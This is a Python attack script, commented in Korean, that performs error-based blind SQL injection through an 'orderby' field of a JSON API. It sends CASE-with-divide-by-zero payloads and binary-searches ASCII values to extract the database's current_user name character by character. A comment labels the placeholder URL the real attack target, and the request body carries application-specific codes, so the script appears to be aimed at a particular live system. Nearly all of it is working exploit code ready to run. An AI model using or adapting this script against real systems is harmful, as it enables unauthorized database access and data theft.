import requests
import json

# 🎯 실제 공격 대상 URL
url = "http://your-target.com/api/endpoint"

# 🛠️ 기본 POST Body 구조 (orderby 필드에 인젝션 삽입)
base_body = {
    "orderColNo": "1",
    "orderby": "",  # injection 들어감
    "startRow": "0",
    "pageSize": "1",
    "prdnCorpCd": "H101," * 73,
    "qltyStdVehlCd": "G9,0R,SS,AR,JR,JJ,JI,JP,01,AO,6X,AL,0A,1V,IB,MH,LN_EL2,LM_HYD,LM_AER,LN_ELE,LM_ELE,DV,HT,DG,GN,GR,HE,FT,C1,UI,S8,MD,GO,MF_ELE,MF_GEN,HH,HK,GI,9I,NM,GW,GX,J9,CZ,GK,I3,G3,PY_MEG,PY_HYD,UH,UG,VG,QV_MEG,SN,QZ_MEG,QZ_MER,1E,1Y,1F,S1,SC,SZ,7R,NC,NL,LK_HYD,LK_AER,LK_ELE,UD,UF,UE,WU_MEG",
    "trimPrdnYmdFrom": "2025.12.20",
    "trimPrdnYmdTo": "2026.01.20",
    "searchCnd": "2"
}

# ✅ 세션 쿠키 설정
cookies = {
    "JSESSIONID": "your-session-id-here"  # 여기에 실제 세션 값 넣기
}

headers = {
    "Content-Type": "application/json",
    "User-Agent": "BlindSQLiAgent"
}

def is_condition_true(pos, val):
    injection = f"desc, (case when ascii(substr((current_user),{pos},1)) > {val} then 1 else 1/0 end)"
    body = base_body.copy()
    body["orderby"] = injection

    try:
        response = requests.post(url, data=json.dumps(body), headers=headers, cookies=cookies, timeout=5)
        return response.status_code == 200
    except Exception:
        return False

def extract_char_at(pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        print(f"[?] Testing position {pos} : ascii > {mid}? ", end="")

        if is_condition_true(pos, mid):
            print("YES")
            low = mid + 1
        else:
            print("NO")
            high = mid - 1

    return chr(high) if 32 <= high <= 126 else "?"

def extract_current_user(max_len=20):
    user = ""
    for i in range(1, max_len + 1):
        ch = extract_char_at(i)
        if ch == "?":
            break
        user += ch
        print(f"[+] Extracted so far: {user}")
    return user

if __name__ == "__main__":
    result = extract_current_user()
    print(f"\n[✔] current_user = {result}")
